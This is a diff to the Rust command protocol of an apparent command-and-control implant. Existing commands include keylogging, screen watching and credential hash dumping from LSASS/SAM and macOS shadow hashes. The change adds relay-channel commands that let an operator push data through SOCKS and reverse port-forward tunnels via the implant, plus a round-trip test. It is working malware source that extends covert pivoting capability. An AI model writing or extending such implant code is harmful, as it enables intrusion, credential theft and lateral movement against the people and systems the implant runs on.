@@ -124,6 +124,16 @@ pub enum Command {
     Screenwatch { interval_secs: u32 },
     /// 凭据哈希提取。`method` 0=SAM(LSASS), 1=hashdump(macOS shadow hash)。
     Hashdump { method: u8 },
+    /// Write `data` to an open relay channel's socket — the operator→implant
+    /// direction of the SOCKS / rportfwd relay. `chan` is the id a prior
+    /// `Connect`/`Socks` returned. Mirrors `Response::Channel { status: 1, data }`
+    /// which carries bytes the OTHER way (socket→operator).
+    ChannelData { chan: u32, data: Vec<u8> },
+    /// Close a relay channel's socket and drop it from the implant's channel
+    /// table. The implant also auto-closes on socket EOF/error (emitting
+    /// `Response::Channel { status: 2 (closed) }`), so this is for explicit
+    /// operator-initiated teardown.
+    ChannelClose { chan: u32 },
 }
 
 /// 文件操作的种类（u8 tag 0-4）。
@@ -258,6 +268,15 @@ impl Command {
                 w.u8(19);
                 w.u8(*method);
             }
+            Command::ChannelData { chan, data } => {
+                w.u8(20);
+                w.u32(*chan);
+                w.blob(data);
+            }
+            Command::ChannelClose { chan } => {
+                w.u8(21);
+                w.u32(*chan);
+            }
         }
     }
 
@@ -321,6 +340,11 @@ impl Command {
             17 => Command::Keylog { action: r.u8()? },
             18 => Command::Screenwatch { interval_secs: r.u32()? },
             19 => Command::Hashdump { method: r.u8()? },
+            20 => Command::ChannelData {
+                chan: r.u32()?,
+                data: r.blob()?.to_vec(),
+            },
+            21 => Command::ChannelClose { chan: r.u32()? },
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -604,5 +628,21 @@ mod tests {
         assert_eq!(round_trip(sw.clone()), sw);
         let hd = Command::Hashdump { method: 0 };
         assert_eq!(round_trip(hd.clone()), hd);
+    }
+
+    #[test]
+    fn channel_data_and_close_roundtrip() {
+        // The relay's operator→implant direction. ChannelData carries arbitrary
+        // bytes (hex on the JSON surface); ChannelClose is just a chan id.
+        let d = Command::ChannelData {
+            chan: 42,
+            data: vec![0xde, 0xad, 0xbe, 0xef],
+        };
+        assert_eq!(round_trip(d.clone()), d);
+        // Empty data is a valid (if useless) write — encode/decode must handle it.
+        let d_empty = Command::ChannelData { chan: 7, data: Vec::new() };
+        assert_eq!(round_trip(d_empty.clone()), d_empty);
+        let c = Command::ChannelClose { chan: 42 };
+        assert_eq!(round_trip(c.clone()), c);
     }
 }
